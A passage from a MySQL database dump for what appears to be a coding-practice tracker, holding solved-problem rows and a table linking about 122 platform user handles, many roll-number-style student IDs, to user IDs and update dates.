2073,128),(12107,2016,128),(12108,1971,128),(12109,1922,128),(12110,1750,128),(12111,1700,128),(12112,1641,128),(12113,1614,128),(12114,1578,128),(12115,1544,128),(12116,1481,128),(12117,1283,128),(12118,1249,128),(12119,1220,128),(12120,2139,128),(12121,1143,128),(12122,1035,128),(12123,1150,128),(12124,1025,128),(12125,997,128),(12126,994,128),(12127,509,128),(12128,950,128),(12129,948,128),(12130,905,128),(12131,793,128),(12132,791,128),(12133,784,128),(12134,743,128),(12135,739,128),(12136,714,128),(12137,713,128),(12138,695,128),(12139,692,128),(12140,678,128),(12141,633,128),(12142,583,128),(12143,560,128),(12144,532,128),(12145,516,128),(12146,494,128),(12147,452,128),(12148,442,128),(12149,435,128),(12150,416,128),(12151,404,128),(12152,402,128),(12153,322,128),(12154,309,128),(12155,299,128),(12156,290,128),(12157,287,128),(12158,257,128),(12159,232,128),(12160,226,128),(12161,225,128),(12162,215,128),(12163,213,128),(12164,207,128),(12165,200,128),(12166,188,128),(12167,155,128),(12168,152,128),(12169,150,128),(12170,148,128),(12171,145,128),(12172,144,128),(12173,135,128),(12174,134,128),(12175,131,128),(12176,129,128),(12177,128,128),(12178,123,128),(12179,122,128),(12180,113,128),(12181,112,128),(12182,104,128),(12183,102,128),(12184,101,128),(12185,100,128),(12186,97,128),(12187,94,128),(12188,85,128),(12189,84,128),(12190,72,128),(12191,63,128),(12192,41,128),(12193,36,128),(12194,32,128),(12195,20,128),(12196,15,128),(12197,12,128),(12198,5,128),(12199,2540,181),(12200,2498,181),(12201,2441,181),(12202,2370,181),(12203,2220,181),(12204,2073,181),(12205,1710,181),(12206,1614,181),(12207,1544,181),(12208,1365,181),(12209,1249,181),(12210,1137,181),(12211,1046,181),(12212,1025,181),(12213,997,181),(12214,930,181),(12215,797,181),(12216,713,181),(12217,695,181),(12218,1721,181),(12219,518,181),(12220,463,181),(12221,456,181),(12222,450,181),(12223,403,181),(12224,264,181),(12225,263,181),(12226,235,181),(12227,234,181),(12228,205,181),(12229,204,181),(12230,203,181),(12231,200,181),(12232,160,181),(12233,110,181),(12234,105,181),(12235,101,181),(12236,100,181),(12237,94,181),(12238,91,181),(12239,79,181),(12240,70,181),(12241,64,181),(12242,62,181),(12243,61,181),(12244,58,181),(12245,57,181),(12246,55,181),(12247,51,181),(12248,22,181),(12249,6,181),(12250,5,181),(12251,3,181),(12252,2958,202),(12253,2962,202),(12254,2864,202),(12255,2807,202),(12256,2816,202),(12257,2697,202),(12258,2769,202),(12259,2540,202),(12260,2485,202),(12261,2444,202),(12262,2396,202),(12263,2367,202),(12264,2326,202),(12265,2325,202),(12266,2130,202),(12267,2129,202),(12268,2095,202),(12269,2073,202),(12270,2000,202),(12271,1971,202),(12272,1877,202),(12273,1791,202),(12274,1768,202),(12275,1750,202),(12276,1700,202),(12277,1647,202),(12278,1669,202),(12279,1614,202),(12280,1578,202),(12281,1588,202),(12282,1552,202),(12283,1544,202),(12284,1557,202),(12285,1528,202),(12286,1474,202),(12287,1487,202),(12288,1482,202),(12289,1365,202),(12290,1332,202),(12291,1324,202),(12292,1282,202),(12293,2215,202),(12294,1249,202),(12295,1200,202),(12296,1957,202),(12297,1171,202),(12298,1108,202),(12299,1091,202),(12300,994,202),(12301,992,202),(12302,988,202),(12303,950,202),(12304,948,202),(12305,942,202),(12306,930,202),(12307,921,202),(12308,918,202),(12309,905,202),(12310,897,202),(12311,841,202),(12312,707,202),(12313,799,202),(12314,797,202),(12315,791,202),(12316,784,202),(12317,701,202),(12318,700,202),(12319,559,202),(12320,713,202),(12321,695,202),(12322,653,202),(12323,621,202),(12324,561,202),(12325,542,202),(12326,506,202),(12327,501,202),(12328,496,202),(12329,475,202),(12330,452,202),(12331,443,202),(12332,404,202),(12333,389,202),(12334,328,202),(12335,263,202),(12336,257,202),(12337,240,202),(12338,239,202),(12339,236,202),(12340,232,202),(12341,229,202),(12342,226,202),(12343,225,202),(12344,222,202),(12345,215,202),(12346,210,202),(12347,208,202),(12348,207,202),(12349,202,202),(12350,200,202),(12351,199,202),(12352,172,202),(12353,155,202),(12354,148,202),(12355,145,202),(12356,144,202),(12357,134,202),(12358,129,202),(12359,128,202),(12360,119,202),(12361,112,202),(12362,110,202),(12363,108,202),(12364,107,202),(12365,104,202),(12366,103,202),(12367,102,202),(12368,101,202),(12369,100,202),(12370,98,202),(12371,94,202),(12372,82,202),(12373,80,202),(12374,79,202),(12375,78,202),(12376,66,202),(12377,64,202),(12378,62,202),(12379,58,202),(12380,57,202),(12381,56,202),(12382,55,202),(12383,41,202),(12384,36,202),(12385,25,202),(12386,24,202),(12387,19,202),(12388,12,202),(12389,7,202),(12390,6,202),(12391,3,202),(12392,2,202),(12393,2965,131),(12394,2923,131),(12395,2859,131),(12396,2864,131),(12397,2824,131),(12398,2770,131),(12399,2643,131),(12400,2574,131),(12401,2500,131),(12402,2469,131),(12403,2413,131),(12404,2373,131),(12405,2235,131),(12406,2149,131),(12407,2160,131),(12408,2129,131),(12409,2108,131),(12410,2073,131),(12411,1920,131),(12412,1720,131),(12413,1637,131),(12414,1608,131),(12415,1578,131),(12416,1552,131),(12417,1545,131),(12418,1486,131),(12419,1481,131),(12420,1470,131),(12421,1431,131),(12422,1365,131),(12423,1337,131),(12424,1310,131),(12425,1200,131),(12426,2139,131),(12427,1299,131),(12428,1287,131),(12429,1291,131),(12430,1043,131),(12431,1035,131),(12432,1011,131),(12433,997,131),(12434,509,131),(12435,948,131),(12436,912,131),(12437,905,131),(12438,888,131),(12439,841,131),(12440,707,131),(12441,793,131),(12442,784,131),(12443,739,131),(12444,714,131),(12445,647,131),(12446,628,131),(12447,611,131),(12448,583,131),(12449,543,131),(12450,540,131),(12451,532,131),(12452,516,131),(12453,513,131),(12454,494,131),(12455,483,131),(12456,477,131),(12457,454,131),(12458,451,131),(12459,404,131),(12460,389,131),(12461,387,131),(12462,368,131),(12463,342,131),(12464,326,131),(12465,311,131),(12466,309,131),(12467,299,131),(12468,264,131),(12469,258,131),(12470,252,131),(12471,243,131),(12472,239,131),(12473,232,131),(12474,231,131),(12475,225,131),(12476,222,131),(12477,216,131),(12478,215,131),(12479,200,131),(12480,188,131),(12481,179,131),(12482,163,131),(12483,162,131),(12484,160,131),(12485,155,131),(12486,150,131),(12487,141,131),(12488,138,131),(12489,137,131),(12490,135,131),(12491,131,131),(12492,123,131),(12493,121,131),(12494,119,131),(12495,112,131),(12496,110,131),(12497,102,131),(12498,100,131),(12499,97,131),(12500,90,131),(12501,89,131),(12502,88,131),(12503,83,131),(12504,81,131),(12505,78,131),(12506,72,131),(12507,69,131),(12508,67,131),(12509,62,131),(12510,55,131),(12511,52,131),(12512,51,131),(12513,49,131),(12514,47,131),(12515,46,131),(12516,45,131),(12517,40,131),(12518,39,131),(12519,37,131),(12520,29,131),(12521,24,131),(12522,22,131),(12523,21,131),(12524,19,131),(12525,17,131),(12526,15,131),(12527,7,131),(12528,6,131),(12529,5,131),(12530,2848,202),(12531,2789,202),(12532,2614,202),(12533,2570,202),(12534,2487,202),(12535,2331,202),(12536,2320,202),(12537,2221,202),(12538,2160,202),(12539,2114,202),(12540,2062,202),(12541,2057,202),(12542,2053,202),(12543,2023,202),(12544,1980,202),(12545,1991,202),(12546,1903,202),(12547,1860,202),(12548,1689,202),(12549,1561,202),(12550,1456,202),(12551,1460,202),(12552,1446,202),(12553,1254,202),(12554,2225,202),(12555,1011,202),(12556,881,202),(12557,796,202),(12558,747,202),(12559,684,202),(12560,380,202),(12561,228,202),(12562,131,202),(12563,63,202),(12564,46,202),(12565,45,202),(12566,2864,140),(12567,2824,140),(12568,2652,140),(12569,2540,140),(12570,2535,140),(12571,2520,140),(12572,2485,140),(12573,2469,140),(12574,2441,140),(12575,2413,140),(12576,2235,140),(12577,2129,140),(12578,1971,140),(12579,1952,140),(12580,1662,140),(12581,1608,140),(12582,1578,140),(12583,1544,140),(12584,1486,140),(12585,1481,140),(12586,2309,140),(12587,1200,140),(12588,2139,140),(12589,1143,140),(12590,1137,140),(12591,1035,140),(12592,997,140),(12593,905,140),(12594,793,140),(12595,786,140),(12596,784,140),(12597,769,140),(12598,746,140),(12599,743,140),(12600,714,140),(12601,695,140),(12602,516,140),(12603,442,140),(12604,389,140),(12605,326,140),(12606,309,140),(12607,304,140),(12608,258,140),(12609,232,140),(12610,231,140),(12611,226,140),(12612,225,140),(12613,202,140),(12614,200,140),(12615,188,140),(12616,155,140),(12617,150,140),(12618,145,140),(12619,144,140),(12620,135,140),(12621,134,140),(12622,123,140),(12623,121,140),(12624,112,140),(12625,110,140),(12626,108,140),(12627,104,140),(12628,102,140),(12629,100,140),(12630,94,140),(12631,78,140),(12632,66,140),(12633,31,140),(12634,28,140),(12635,12,140),(12636,11,140),(12637,7,140),(12638,3,140),(12639,342,140),(12640,2942,181),(12641,2859,181),(12642,2770,181),(12643,2582,181),(12644,2486,181),(12645,2373,181),(12646,2235,181),(12647,2231,181),(12648,2114,181),(12649,2089,181),(12650,2053,181),(12651,2037,181),(12652,1863,181),(12653,1704,181),(12654,1717,181),(12655,1684,181),(12656,1636,181),(12657,1608,181),(12658,1404,181),(12659,1389,181),(12660,2191,181),(12661,1550,181),(12662,1143,181),(12663,1108,181),(12664,938,181),(12665,866,181),(12666,860,181),(12667,784,181),(12668,746,181),(12669,650,181),(12670,539,181),(12671,455,181),(12672,448,181),(12673,350,181),(12674,240,181),(12675,171,181),(12676,137,181),(12677,119,181),(12678,78,181),(12679,69,181),(12680,46,181),(12681,45,181),(12682,40,181),(12683,39,181),(12684,37,181),(12685,34,181),(12686,13,181),(12687,7,181);
/*!40000 ALTER TABLE `track_solved_problem` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_user_handle`
--

DROP TABLE IF EXISTS `track_user_handle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_user_handle` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `user_handle` varchar(255) NOT NULL,
  `last_update` date DEFAULT NULL,
  `platform_id` bigint NOT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `track_user_handle_platform_id_cf356000_fk_track_platform_id` (`platform_id`),
  CONSTRAINT `track_user_handle_platform_id_cf356000_fk_track_platform_id` FOREIGN KEY (`platform_id`) REFERENCES `track_platform` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=123 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_user_handle`
--

LOCK TABLES `track_user_handle` WRITE;
/*!40000 ALTER TABLE `track_user_handle` DISABLE KEYS */;
INSERT INTO `track_user_handle` VALUES (1,'user0839VG','2024-02-14',1,3),(2,'21ada64','2024-04-18',1,127),(3,'21ADA61','2024-04-18',1,128),(4,'21CSA60','2024-02-14',1,129),(5,'21csa36','2024-02-16',1,130),(6,'21csa27','2024-05-14',1,131),(7,'21csa12','2024-04-17',1,132),(8,'21csa42','2024-04-17',1,133),(9,'21csa19','2024-02-14',1,134),(10,'21csa28','2024-04-17',1,135),(11,'21csa54','2024-01-24',1,136),(12,'21ECB20','2024-02-14',1,137),(13,'21ecb59','2024-02-14',1,138),(14,'21ecb13','2024-04-17',1,139),(15,'arunlorenz','2024-05-31',1,140),(16,'21ecb29','2024-02-14',1,141),(17,'21eca17','2024-04-18',1,142),(18,'21eca01','2024-01-23',1,143),(19,'21ita57','2024-04-17',1,144),(20,'21ita30','2024-04-17',1,145),(21,'21ita47','2024-01-23',1,146),(22,'21ita17','2024-04-17',1,147),(23,'21mea20','2024-02-14',1,148),(24,'21mea45','2024-01-22',1,149),(25,'21ita44','2024-02-18',1,150),(26,'21ecb32','2024-01-25',1,151),(27,'21eea29','2024-02-16',1,156),(28,'Sarveshwara-30','2024-02-14',1,157),(29,'21ita43','2024-01-25',1,158),(30,'RITHISHA26','2024-01-25',1,159),(31,'21ecb17','2024-03-25',1,160),(32,'21eca18','2024-01-24',1,161),(33,'21ecb58','2024-01-25',1,162),(34,'t21ada','2024-02-27',1,163),(35,'21ita48','2024-02-14',1,164),(36,'22lita03','2024-03-04',1,165),(37,'21mea10','2024-02-14',1,166),(38,'DHANUSHKODI_L_V','2024-02-15',1,167),(39,'21mea04','2024-01-25',1,168),(40,'21ita50','2024-01-24',1,169),(41,'KARUPPAIYA18','2024-02-15',1,170),(42,'AADHI007','2024-01-23',1,171),(43,'21mea09','2024-02-29',1,172),(44,'harishwar08','2024-02-15',1,173),(45,'21ecb23','2024-02-28',1,174),(46,'Aravindamr','2024-02-15',1,175),(47,'21ita42','2024-02-15',1,176),(48,'21ita16','2024-02-19',1,177),(49,'21eca22','2024-01-24',1,178),(50,'21eca37','2024-02-14',1,179),(51,'21ita46','2024-01-25',1,180),(52,'Nivethan03','2024-09-24',1,181),(53,'amithasrini149','2024-01-25',1,182),(54,'21ITA39','2024-02-14',1,183),(55,'rachika2793','2024-03-04',1,184),(56,'parthiban_s','2024-02-15',1,185),(57,'21ita53','2024-02-14',1,186),(58,'21ada20','2024-01-25',1,187),(59,'21csa56','2024-01-25',1,188),(60,'21ita37','2024-03-02',1,189),(61,'21ita28','2024-02-14',1,190),(62,'21csa40','2024-02-19',1,191),(63,'21ita26','2024-01-25',1,192),(64,'21ada27','2024-02-14',1,193),(65,'SANJAY-S-KIT','2024-01-25',1,194),(66,'Roshan1983','2024-02-18',1,195),(67,'21eca51','2024-03-27',1,196),(68,'21ecb06','2024-02-18',1,197),(69,'21ita34','2024-02-19',1,198),(70,'Dharunk10','2024-02-15',1,199),(71,'divit_e_g','2024-01-23',1,200),(72,'Vijayakanthan','2024-02-19',1,201),(73,'21ita32','2024-05-25',1,202),(74,'akshayashreechandran','2024-01-24',1,203),(75,'jishasree2002','2024-02-19',1,204),(76,'21ecb54','2024-01-24',1,205),(77,'21ita10','2024-02-14',1,206),(78,'21ada52','2024-01-24',1,207),(79,'Lathika_N','2024-02-14',1,208),(80,'Eniya_M','2024-01-25',1,209),(81,'21ecb56','2024-01-25',1,210),(82,'MahibaRavi','2024-01-25',1,211),(83,'Devi_Bala','2024-02-29',1,212),(84,'ARamanan','2024-01-25',1,213),(85,'deepika_madhesh','2024-01-25',1,214),(86,'21ITA55','2024-01-25',1,215),(87,'user0220aR','2024-01-22',1,216),(88,'Yuvaraj7117','2024-04-02',1,217),(89,'21ita33','2024-02-15',1,218),(90,'Devi_priya2012','2024-02-14',1,219),(91,'21ada02','2024-01-25',1,220),(92,'21eca41','2024-02-17',1,221),(93,'21csa11','2024-01-22',1,222),(94,'NebulaByte','2024-02-14',1,223),(95,'THIRUNAVUKKARASU1','2024-01-25',1,224),(96,'shakthi_yaadav',NULL,1,225),(97,'21ita40','2024-01-25',1,226),(98,'ManiE18','2024-02-15',1,227),(99,'c_varshinii','2024-02-14',1,228),(100,'kasimani272004','2024-02-16',1,229),(101,'21ita60','2024-01-25',1,230),(102,'21ada29','2024-01-25',1,231),(103,'mariarija04','2024-01-25',1,232),(104,'21csa25','2024-02-22',1,233),(105,'mohanajaganathan','2024-01-25',1,234),(106,'21eea02','2024-02-15',1,235),(107,'afreenhaji','2024-01-25',1,236),(108,'21csa57','2024-02-14',1,237),(109,'21ada57_kit','2024-01-25',1,238),(110,'21ada07','2024-01-21',1,239),(111,'21CSA46','2024-02-14',1,240),(112,'21ada60','2024-01-21',1,241),(113,'21csa49','2024-02-15',1,242),(114,'madhumitha_kalaiselvan','2024-01-25',1,243),(115,'msmathanvijay','2024-01-25',1,244),(116,'21csa41','2024-01-25',1,245),(117,'21ada32','2024-01-21',1,246),(118,'21ada17','2024-01-21',1,247),(119,'21csa39','2024-03-02',1,248),(120,'Dhanavel_gs','2024-01-23',1,154),(121,'mmanimithran','2024-02-28',1,249),(122,'21csa23','2024-02-15',1,250);
/*!40000 ALTER TABLE `track_user_handle` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-06-03 11:57:01
